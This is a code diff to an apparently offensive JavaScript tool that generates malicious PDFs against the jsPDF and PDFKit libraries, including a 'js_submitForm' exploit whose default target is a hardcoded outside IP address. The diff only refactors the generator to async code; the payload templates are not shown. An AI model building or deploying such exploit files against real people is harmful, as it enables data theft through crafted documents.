@@ -71,7 +71,7 @@ function checkArgs(myArgs){
 	return 1
 }
 
-function createExploit(vuln_lib, exploit, outname, direction='http://20.211.25.32/index.php'){
+async function createExploit(vuln_lib, exploit, outname, direction='http://20.211.25.32/index.php'){
 	switch(vuln_lib){
 	case 'jsPDF':
 		const jsPDF_template = require("./jsPDF_template.js");
@@ -107,18 +107,25 @@ function createExploit(vuln_lib, exploit, outname, direction='http://20.211.25.3
 		var PDFkit_dict = {'js_submitForm': template_PDFkit.js_submitForm} 
 		if (PDFkit_dict.hasOwnProperty(exploit) ){
 			console.log("[+] Generating " + exploit + " ....");
-			template_status = PDFkit_dict[exploit](outname, direction)
-			template_status.then(status => {
-			if (status[1] == 1){
-				if(status.length == 3){
-					return [1, "[+] Finished bake " + chalk.cyan(exploit) + ", saved to " + chalk.cyan(status[0]) + "\n\tURL: " + chalk.blue(direction)]	
-				} else {
-					return [1, "[+] Finished bake " + chalk.cyan(exploit) + ", saved to " + chalk.cyan(status[0])]			
+			let get_myfile_status = new Promise((res, rej) => {
+	        	template_status = PDFkit_dict[exploit](outname, direction)
+				template_status.then(status => {
+				if (status[1] == 1){
+					if(status.length == 3){
+						console.log("returning 1, message")
+						message = [1, "[+] Finished bake " + chalk.cyan(exploit) + ", saved to " + chalk.cyan(status[0]) + "\n\tURL: " + chalk.blue(direction)]	
+					} else {
+						message = [1, "[+] Finished bake " + chalk.cyan(exploit) + ", saved to " + chalk.cyan(status[0])]			
+					}
+				}else {			
+					message = [-1, chalk.red("[-] Failed to bake" + exploit)] 
 				}
-			}else {			
-				return [-1, chalk.red("[-] Failed to bake" + exploit)] 
-			}
-			})
+				})
+		        setTimeout(() => res(message), 1000)
+	    	});
+
+		    let result = await get_myfile_status; 
+			return message
 		}
 		break;
 	default:
@@ -133,7 +140,7 @@ function test_exploit(){
 	return -1;
 }
 
-function main(){
+async function main(){
 	myArgs = parser.parse_args()
 	// console.log(myArgs)
 	if(checkArgs(myArgs) == 0){
@@ -144,7 +151,7 @@ function main(){
 	const outname = myArgs.output
 	const direction = myArgs.uri
 
-	const myfile = createExploit(vuln_lib, exploit, outname, direction)
+	const myfile = await createExploit(vuln_lib, exploit, outname, direction)
 	console.log(myfile[1])
 	// if(myfile == -1){
 	// 	console.log("Failed to create file, unable to test")
